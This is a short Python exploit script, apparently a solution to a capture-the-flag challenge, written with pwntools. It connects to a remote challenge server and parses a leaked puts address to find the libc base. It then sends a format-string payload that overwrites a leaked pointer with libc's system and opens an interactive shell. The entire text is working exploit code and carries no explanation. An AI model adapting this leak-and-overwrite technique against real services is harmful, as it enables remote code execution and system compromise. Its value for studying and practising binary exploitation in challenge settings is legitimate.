from pwn import *

elf = context.binary = ELF("./chall")
# p = process()
p = remote("fmt1.pwny.shellmates.club",445,ssl=True)
libc = elf.libc


p.sendline(b"\n" * 10)
p.recvuntil("> Description: No idea what is does , it only gives you this : ")
LEAK = p.recvline().decode()
SPLITED = LEAK.split(" ")
PUTS_LEAK = int(SPLITED[0].strip()[2:],16) 
NEXT_LEAK = int(SPLITED[-1].strip()[2:],16)
print("PUTS_LEAK: ", hex(PUTS_LEAK))
print("NEXT_LEAK: ", hex(NEXT_LEAK))

libc.address = PUTS_LEAK - libc.sym["puts"]
print("LIBC: ", hex(libc.address)) 



offset = 4
payload = fmtstr_payload(4,{NEXT_LEAK : libc.sym["system"]})
p.sendline(payload)
# gdb.attach(p)
p.interactive()